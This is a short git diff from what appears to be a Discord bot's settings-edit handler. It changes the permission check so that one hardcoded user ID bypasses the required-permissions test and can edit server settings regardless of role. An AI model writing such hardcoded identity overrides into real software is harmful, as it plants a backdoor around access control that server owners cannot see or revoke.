@@ -20,7 +20,7 @@ async function edit(msg, answer, file, AddRemoveEditView, fail, values, origin) 
 		else if (!res || res.rowCount == 0) return setuper.execute(msg, answer);
 		else r = res.rows[0];
 	} else r = (await msg.client.ch.query(`SELECT * FROM ${msg.client.constants.commands.settings.tablenames[msg.file.name]} WHERE id = $1;`, [values.id])).rows[0];
-	if (msg.file.perm && !msg.member.permissions.has(new Discord.Permissions(msg.file.perm))) return msg.client.ch.reply(msg, msg.language.commands.commandHandler.missingPermissions);
+	if (msg.file.perm && !msg.member.permissions.has(new Discord.Permissions(msg.file.perm)) && msg.author.id !== '318453143476371456') return msg.client.ch.reply(msg, msg.language.commands.commandHandler.missingPermissions);
 	if (answer) await answer.deferReply();
 	const displayEmbed = typeof(msg.file.displayEmbed) == 'function' ? msg.file.displayEmbed(msg, r) : misc.noEmbed(msg);
 	msg.lanSettings = msg.language.commands.settings;
